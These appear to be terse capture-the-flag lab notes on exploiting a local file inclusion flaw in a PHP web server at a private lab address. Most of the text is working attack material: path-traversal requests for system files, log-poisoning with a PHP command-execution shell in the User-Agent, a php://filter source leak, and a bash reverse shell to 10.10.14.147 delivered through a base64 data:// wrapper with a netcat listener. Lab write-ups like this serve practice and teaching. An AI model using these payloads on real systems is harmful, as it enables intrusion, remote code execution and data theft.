ip = 10.129.72.166

nmap report

just port 80

---

http port 80 works

file traversing works!

ubuntu

---

http://10.129.72.166/?file=../../../../../../../../../etc/ldap/ldap.conf

file traversing works. not useful for this particular box but you can use log poisoning to embed some malicious php which can be detonated by including that file.

Log Poisoning Techniques:

Apache logs: ?file=../../../var/log/apache2/access.log

Poison via User-Agent: <?php system($_GET['cmd']); ?>

SSH logs: ?file=../../../var/log/auth.log

SSH with username containing PHP code

Mail logs: ?file=../../../var/log/mail.log

---

php injection works - ?file=php://filter/read=convert.base64-encode/resource=index.php

---

Create the reverse shell payload:
php<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.147/443 0>&1'"); ?>
Base64 encode it:
bashecho "<?php system(\"bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\"); ?>" | base64 -w 0
Set up your listener first:
bashnc -lvnp 4444
Deliver the payload:
?file=data://text/plain;base64,[YOUR_BASE64_ENCODED_PAYLOAD]
Replace YOUR_IP with your actual IP address in the payload before encoding.

---

**_php-payload-stage1.php_**

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.147/443 0>&1'"); ?>
```

**_php-payload-stage2.php_**

```php
data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0Ny80NDMgMD4mMSciKTsgPz4K
```
